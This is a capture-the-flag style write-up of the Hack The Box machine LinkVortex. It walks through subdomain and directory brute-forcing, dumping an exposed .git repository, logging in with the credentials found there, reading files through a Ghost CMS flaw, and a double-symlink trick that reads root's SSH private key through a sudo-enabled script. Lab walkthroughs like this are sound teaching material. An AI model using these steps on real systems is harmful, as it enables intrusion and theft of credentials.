---
date: 2025-04-11T22:37:01-05:00
# description: ""
image: "/images/HTB-LinkVortex/LinkVortex"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: LinkVortex"
type: "post"
---

* Platform: Hack The Box
* Link: [LinkVortex](https://app.hackthebox.com/machines/LinkVortex)
* Level: Easy
* OS: Linux
---

LinkVortex runs a vulnerable version of Ghost CMS. Through directory brute-forcing and subdomain enumeration, we discover the admin login page and an exposed `.git` directory, which contains valid credentials for authentication. We then leverage `CVE-2023-40028`, a file read vulnerability, to read sensitive files on the server, eventually finding another set of credentials. These allow us to gain an initial foothold via SSH. Privilege escalation is achieved by exploiting a script executable as root.

## Scanning

```
nmap -sC -sV {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 09:42 CST
Nmap scan report for 10.129.231.194
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)

80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds
```

Two open ports are found: `22` running SSH and `80` running http. Additionally there is a redirection to `linkvortex.htb`.

```
sudo echo "{TARGET_IP} linkvortex.htb" | sudo tee -a /etc/hosts
```

## Enumeration

At `http://linkvortex.htb/` we find a static website powered by [Ghost CMS](https://ghost.org/). Wappalyzer tells us that `version 5.58` is used. 

![LinkVortex website](/images/HTB-LinkVortex/linkvortex_website.png)

With directory brute forcing we find `/ghost`.

```
feroxbuster -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 200 -r --scan-dir-listings -C 403,404
```

![ghost hidden directory](/images/HTB-LinkVortex/ghost_directory.png)

Visiting `http://linkvortex.htb/ghost/` we get to an Admin login page.

![ghost admin page](/images/HTB-LinkVortex/ghost_admin_page.png)

With some subdomain enumeration we discover the `dev` subdomain.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -ic -fs 230
```

![dev subdomain found](/images/HTB-LinkVortex/subdomain_dev.png)

`http://dev.linkvortex.htb/` leads to another website which is under construction.

![website at dev subdomain](/images/HTB-LinkVortex/dev_subdomain_website.png)

We go back to directory bruteforcing for the subdomain and find a `.git` directory.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://dev.linkvortex.htb/FUZZ -ic --fc 404,403
```

![git hidden folder](/images/HTB-LinkVortex/subdomain_git.png)

When visiting `http://dev.linkvortex.htb/.git` we find some files for a git repository.

![git files](/images/HTB-LinkVortex/linkvortex_git_files.png)

We dump the repository available at `http://dev.linkvortex.htb/.git` with [git-dumper](https://github.com/arthaud/git-dumper).

```
git-dumper http://dev.linkvortex.htb/.git git_linkvortex
```

![git dumper command](/images/HTB-LinkVortex/git_dumper_linkvortex.png)

Inside the directory we look for credentials, using `grep -iR "password"`. A few possible password are discovered.

![passwords found in project files](/images/HTB-LinkVortex/passwords_found.png)

We are able to login at `http://linkvortex.htb/ghost` with `admin@linkvortex.htb:OctopiFociPilfer45` and get access to the Ghost dashboard.

![Ghost Dashboard](/images/HTB-LinkVortex/ghost_dashboard.png)

## Intial Foothold

Now that we have some valid credentials we can use [this PoC](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) for `CVE-2023-40028` to read files on the target system.

![CVE-2023-40028](/images/HTB-LinkVortex/CVE-2023-40028.png)

Among the repository files there is one called `Dockerfile.ghost`, checking its content we find a configuration file at `/var/lib/ghost/config.production.json`.

Using our file read vulnerability we read `/var/lib/ghost/config.production.json` and find the credentials for another user.

![Dockerfile config](/images/HTB-LinkVortex/creds_docker_config.png)

```
bob@linkvortex.htb:fibber-talented-worth
```

We login via SSH as `bob` and can read the user flag.

![user flag](/images/HTB-LinkVortex/user_flag.png)

## Privilege Escalation

We check the sudo privileges of the user and find out that he can run `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png` as any user, without providing a password.

![sudo privileges for bob](/images/HTB-LinkVortex/sudo_privs_linkvortex.png)

The content of `/opt/ghost/clean_symlink.sh` is as below

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

The `clean_symlink.sh` script is designed to handle symbolic links targeting `.png` files. It checks whether the provided file is a symlink and, if so, determines its target path. If the symlink points to a sensitive directory such as `/etc` or `/root`, the script deletes it. Otherwise, it moves the symlink to a quarantine directory (`/var/quarantined/`). Additionally, when the environment variable `CHECK_CONTENT=true` is set, the script attempts to read and display the contents of the file (or the file the symlink points to).

We can try to exploit the script with a symlink pointing to the root SSH key.

```
touch id_rsa.png
ln -sf /root/.ssh/id_rsa id_rsa.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh id_rsa.png
```

As expected it gets removed.

![Symlink exploit failure](/images/HTB-LinkVortex/symlink_exploit_fail.png)

Let's try another method. This time we will use two symlinks in order to bypass the security feature of the script.

```
cd ~
ln -s /root/.ssh/id_rsa id_rsa.txt
ln -s /home/bob/id_rsa.txt root.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/root.png
```

![root privilege escalation](/images/HTB-LinkVortex/root_exploitation.png)

We successfully exploit the script and obtain the root SSH key. We save the recovered SSH private key and use it to authenticate as the root user.

![root flag](/images/HTB-LinkVortex/root_flag.png)

### Exploit Explanation

The script detects `root.png` as a valid file matching the `*.png` pattern and proceeds to process it. However, `root.png` is actually a symlink to `id_rsa.txt`, which is itself a symlink to `/root/.ssh/id_rsa`.

Since `CHECK_CONTENT=true`, the script displays the content of the file our symlink points to. Because the script runs with root privileges, it successfully follows both symlinks and ends up reading the contents of `/root/.ssh/id_rsa`.











